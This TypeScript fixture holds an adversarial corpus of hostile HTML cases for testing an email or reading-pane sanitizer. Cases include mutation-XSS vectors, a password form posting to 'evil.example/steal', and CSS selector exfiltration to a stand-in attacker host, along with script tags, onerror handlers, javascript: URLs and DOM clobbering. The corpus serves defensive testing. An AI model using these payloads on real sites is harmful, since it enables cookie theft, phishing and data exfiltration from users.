/**
 * The adversarial corpus — the heart of the W-A4 epic.
 *
 * Each case is a piece of hostile HTML with a STATED attack. The tests in
 * sanitize.test.ts run every case through the real sanitizer and assert the
 * attack is neutralized — no case is here for decoration. The vectors are
 * the ones the research names (docs/research/04 §4.3), the ones from
 * DOMPurify's own published bypass history worth pinning, and the mutation-
 * XSS class that is the reason layer 3 exists at all.
 *
 * `mustNotContain` / `mustNotMatch` are checked against the sanitizer's
 * OUTPUT STRING (belt) AND the assertions in the test additionally parse the
 * output and inspect the live tree (braces): a string check alone can be
 * fooled by an entity that the browser later decodes, so both run.
 */

export interface AttackCase {
  /** A short id, unique, used in the test name. */
  readonly id: string;
  /** What the attacker is trying to do. */
  readonly attack: string;
  /** The hostile input. */
  readonly html: string;
  /** Substrings that must NOT appear anywhere in the sanitized output. */
  readonly mustNotContain?: readonly string[];
  /** Regexes the sanitized output must NOT match. */
  readonly mustNotMatch?: readonly RegExp[];
}

export const ATTACK_CORPUS: readonly AttackCase[] = [
  // --- script execution ---------------------------------------------------
  {
    id: "script-tag",
    attack: "A bare <script> executes on render.",
    html: `<p>hi</p><script>window.parent.location='https://evil'</script>`,
    mustNotContain: ["<script", "window.parent"],
  },
  {
    id: "script-split",
    attack: "Nested <scr<script>ipt> reassembles after a naive strip.",
    html: `<scr<script>ipt>alert(1)</scr</script>ipt>`,
    // The <script> element must be gone; any residue of the payload survives
    // only as INERT escaped text (&gt;), which cannot execute. The structural
    // assertInert check confirms no <script> element exists in the tree.
    mustNotContain: ["<script"],
    mustNotMatch: [/<script/i],
  },
  {
    id: "img-onerror",
    attack: "onerror fires when the image 404s.",
    html: `<img src="x" onerror="alert(document.cookie)">`,
    mustNotContain: ["onerror", "alert", "document.cookie"],
  },
  {
    id: "svg-onload",
    attack: "SVG is foreign content with its own onload.",
    html: `<svg onload="alert(1)"><circle r="10"/></svg>`,
    mustNotContain: ["<svg", "onload", "alert"],
  },
  {
    id: "body-onload-attr-injection",
    attack: "An event handler smuggled by odd quoting.",
    html: `<div onmouseover=alert(1)>x</div>`,
    mustNotContain: ["onmouseover", "alert"],
  },
  {
    id: "handler-uppercase",
    attack: "Case tricks the handler-name check.",
    html: `<a href="#" OnClick="alert(1)">x</a>`,
    mustNotMatch: [/on\w+\s*=/i],
    mustNotContain: ["alert"],
  },

  // --- javascript: and friends in every URL slot --------------------------
  {
    id: "href-javascript",
    attack: "javascript: in an href.",
    html: `<a href="javascript:alert(1)">click</a>`,
    mustNotContain: ["javascript:", "alert"],
  },
  {
    id: "href-javascript-obfuscated",
    attack: "Tab/newline-split scheme to dodge a string check.",
    html: `<a href="jav&#x09;ascript:alert(1)">x</a><a href="java\nscript:alert(1)">y</a>`,
    mustNotContain: ["javascript:", "alert"],
  },
  {
    id: "img-src-javascript",
    attack: "javascript: in an image src.",
    html: `<img src="javascript:alert(1)">`,
    mustNotContain: ["javascript:", "alert"],
  },
  {
    id: "vbscript",
    attack: "vbscript: scheme.",
    html: `<a href="vbscript:msgbox(1)">x</a>`,
    mustNotContain: ["vbscript:", "msgbox"],
  },
  {
    id: "data-html-href",
    attack: "data:text/html navigates to attacker script.",
    html: `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
    mustNotContain: ["data:text/html", "<script"],
  },

  // --- document-level directives ------------------------------------------
  {
    id: "base-tag",
    attack: "<base> rebases every relative URL to an attacker host.",
    html: `<base href="https://evil.example/"><a href="pay.html">Pay</a>`,
    mustNotContain: ["<base", "evil.example"],
  },
  {
    id: "meta-refresh",
    attack: "meta refresh redirects the reader.",
    html: `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
    mustNotContain: ["<meta", "refresh", "evil.example"],
  },

  // --- phishing forms -----------------------------------------------------
  {
    id: "credential-form",
    attack: "A password form phishes inside the reading pane.",
    html: `<form action="https://evil.example/steal" method="post">
      <input type="password" name="pw"><button>Sign in</button></form>`,
    mustNotContain: ["<form", "<input", "<button", "evil.example"],
  },

  // --- nested browsing contexts -------------------------------------------
  {
    id: "iframe",
    attack: "A nested iframe loads attacker content.",
    html: `<iframe src="https://evil.example"></iframe>`,
    mustNotContain: ["<iframe", "evil.example"],
  },
  {
    id: "object-embed",
    attack: "object/embed load plugin or document content.",
    html: `<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">`,
    mustNotContain: ["<object", "<embed", "evil.example"],
  },

  // --- CSS: the Spy Sheets class ------------------------------------------
  {
    id: "style-element",
    attack: "A <style> element with an attribute-selector url() exfiltrates.",
    html: `<style>input[value^="a"]{background:url(https://evil.example/a)}</style><p>x</p>`,
    mustNotContain: ["<style", "evil.example", "url("],
  },
  {
    id: "style-import",
    attack: "@import pulls an external sheet that then exfiltrates.",
    html: `<style>@import url('https://evil.example/s.css');</style>`,
    mustNotContain: ["@import", "evil.example"],
  },
  {
    id: "inline-background-url",
    attack: "Inline background url() is a conditional tracking fetch.",
    html: `<div style="background:url(https://evil.example/pixel.gif)">x</div>`,
    mustNotContain: ["evil.example", "url("],
  },
  {
    id: "inline-expression",
    attack: "expression() is legacy CSS code execution.",
    html: `<div style="width:expression(alert(1))">x</div>`,
    mustNotContain: ["expression", "alert"],
  },
  {
    id: "link-stylesheet",
    attack: "<link rel=stylesheet> pulls an external, exfiltrating sheet.",
    html: `<link rel="stylesheet" href="https://evil.example/s.css"><p>x</p>`,
    mustNotContain: ["<link", "evil.example"],
  },
  {
    id: "position-fixed-overlay",
    attack: "A fixed-position overlay covers the real UI to spoof it.",
    html: `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff">SPOOF</div>`,
    mustNotMatch: [/position\s*:\s*fixed/i],
  },

  // --- mutation XSS (the reason layer 3 exists) ---------------------------
  {
    id: "mxss-mglyph",
    attack: "mglyph/malformed foreign content mutates on re-parse (classic mXSS).",
    html: `<svg><mglyph><style><img src=x onerror=alert(1)></style></mglyph></svg>`,
    mustNotContain: ["onerror", "alert", "<svg", "<style"],
  },
  {
    id: "mxss-noscript",
    attack: "noscript parses differently with/without scripting enabled.",
    html: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
    mustNotContain: ["onerror", "alert"],
  },
  {
    id: "mxss-comment",
    attack: "A conditional/broken comment smuggles markup on re-parse.",
    html: `<!--[if]><img src=x onerror=alert(1)>--><p>x</p>`,
    mustNotContain: ["onerror", "alert"],
  },
  {
    id: "mxss-title-textarea",
    attack: "RCDATA elements (title/textarea) hide live markup.",
    html: `<title><img src=x onerror=alert(1)></title><textarea></textarea onerror=alert(2)>`,
    mustNotContain: ["onerror", "alert"],
  },
  {
    id: "mxss-form-nesting",
    attack: "DOM-clobbering via named form controls.",
    html: `<form><input name="attributes"></form>`,
    mustNotContain: ["<form", "<input"],
  },
  {
    id: "dom-clobber-id",
    attack: "id/name clobber document properties the app might read.",
    html: `<a id="cookie" name="body">x</a>`,
    mustNotMatch: [/\bid\s*=/i, /\bname\s*=/i],
  },

  // --- secondary URL carriers ---------------------------------------------
  {
    id: "srcset",
    attack: "srcset is a second image-URL slot bypassing src.",
    html: `<img src="data:image/png;base64,AA==" srcset="https://evil.example/p.png 1x">`,
    mustNotContain: ["srcset", "evil.example"],
  },
  {
    id: "anchor-ping",
    attack: "ping= fires a background POST to the attacker on click.",
    html: `<a href="https://ok.example" ping="https://evil.example/track">x</a>`,
    mustNotContain: ["ping", "evil.example"],
  },

  // --- real-world-ish shapes that must SURVIVE cleanly ---------------------
  {
    id: "benign-newsletter",
    attack: "(control) A normal styled newsletter must render, not be gutted.",
    html: `<table width="100%"><tr><td style="padding:8px;color:#333">
      <h1 style="font-size:20px">Hello</h1>
      <p>Read our <a href="https://example.com/post">latest post</a>.</p>
      <img src="https://cdn.example.com/banner.png" alt="Banner" width="600">
      </td></tr></table>`,
  },
];
